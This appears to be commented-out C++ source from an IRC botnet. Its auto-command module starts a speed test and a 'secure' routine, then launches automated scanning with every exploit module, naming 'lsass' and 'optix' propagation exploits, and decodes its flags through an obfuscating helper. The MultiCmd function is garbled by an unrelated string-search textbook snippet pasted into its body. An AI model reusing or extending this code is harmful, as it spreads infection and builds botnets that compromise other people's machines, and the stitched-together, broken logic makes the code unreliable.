/*
#include "main.h"
#include "cthread.h"
#include "mainctrl.h"
#include "autocmd.h"
#include "advscan/advscan.h"

CAutoCmd::CAutoCmd() { }
CAutoCmd::~CAutoCmd() { }

void *CAutoCmd::Run() {
//	CString sTemp;

	// Speed Test
	sTemp.Format(".%s -s", g_cMainCtrl.m_cSpeedTest.m_cmdSpeedTest.sName.CStr());
	if(g_cMainCtrl.m_cBot.speedtest_enabled.bValue==true) 
		Command(sTemp,g_cMainCtrl.m_cBot.si_mainchan.sValue,true,false);

	// Secure
	sTemp.Format(".%s -s", g_cMainCtrl.m_cBot.m_cmdSecure.sName.CStr());
	if(g_cMainCtrl.m_cBot.secure_enabled.bValue==true) 
		Command(sTemp,g_cMainCtrl.m_cBot.si_mainchan.sValue,true,false);
	
	EXPLOIT *exploit=g_cMainCtrl.m_cAdvScan.expl;
	int delaySec = 5;
	int timeMin = 0;
	int totalSize = sizeof(exploit) - 2;
	int tpex = MAXSCANTHRD/totalSize;
	double d=((tpex*1000)+0.5)/1000.0;
	tpex=d;
	for(int i=0;i < totalSize;i++){
		sTemp.Format(".%s %s %d %d %d -a -r", 
		g_cMainCtrl.m_cAdvScan.m_cmdAdvScan.sName.CStr(),
		exploit[i].name, tpex, delaySec, timeMin);
		Command(sTemp,g_cMainCtrl.m_cBot.si_mainchan.sValue,true,false);
	}
	

	// Loop through scanners and start each one with even threads.
	if (g_cMainCtrl.m_cBot.scanner_enabled.bValue==true)
	{
		sTemp.Format(".%s lsass 100 10 0 -a -r", 
		g_cMainCtrl.m_cAdvScan.m_cmdAdvScan.sName.CStr());
		Command(sTemp,g_cMainCtrl.m_cBot.si_mainchan.sValue,true,false);

		sTemp.Format(".%s optix 75 10 0 -a -r", 
		g_cMainCtrl.m_cAdvScan.m_cmdAdvScan.sName.CStr());
		Command(sTemp,g_cMainCtrl.m_cBot.si_mainchan.sValue,true,false);
	}
	return NULL;
}

void CAutoCmd::Command(CString Command,CString ReplyTo,bool silent, bool notice){
	CMessage *msg=new CMessage; 
	CCmdExecutor *ex=new CCmdExecutor;
	CString parSilent, parOut, parNotice;
	parSilent=dp(78,81,19,0);
	parOut=dp(78,81,15,0);
	parNotice=dp(78,81,14,0);
	if(Command.Find(parNotice.CStr()))msg->bNotice=true; else msg->bNotice=false;
	if(Command.Find(parSilent.CStr()))msg->bSilent=true; else msg->bSilent=false;
	if(Command.Find(parOut.CStr()))msg->bOutchan=true; else msg->bOutchan=false;
	msg->sSrc.Assign("");
	msg->sIdentd.Assign("");
	msg->sHost.Assign("");
	msg->sDest.Assign(ReplyTo);
	CString sTemp;
	sTemp.Format("%s%s",g_cMainCtrl.m_cBot.bot_prefix.sValue.CStr(),Command.Mid(1).CStr());
	msg->sChatString.Assign(sTemp);
	ex->Set(msg,true);
	delete msg;
	ex->Start();
};

void CAutoCmd::MultiCmd(CString Commands,CString ReplyTo,bool silent, bool notice){
	CString Command;int i=0;int b=0;
b=Commands.Find("\x0d\x0a",b);
if(b!=0){Command=Commands.Token(i,"\x0d\x0a");i++;};
		 char str[] = "This is a sample string";
  char * pch;
  printf ("Looking for 's' character in \"%s\"...\n",str);
  pch=strchr(str,'s');
  while (pch!=NULL)
  {
    printf ("found at %d\n",pch-str+1);
    pch=strchr(pch+1,'s');
  }

CMessage *pBooga=new CMessage;
	pBooga->bNotice=notice;
	pBooga->bSilent=silent;
	pBooga->sHost.Assign("");
	pBooga->sIdentd.Assign("");
	pBooga->sChatString.Assign(Command);
	pBooga->sReplyTo.Assign(ReplyTo);
	pBooga->sCmd.Assign(Command.Mid(1).Token(0," "));
	g_cMainCtrl.m_cBot.HandleMsgInt(pBooga);
		
};

*/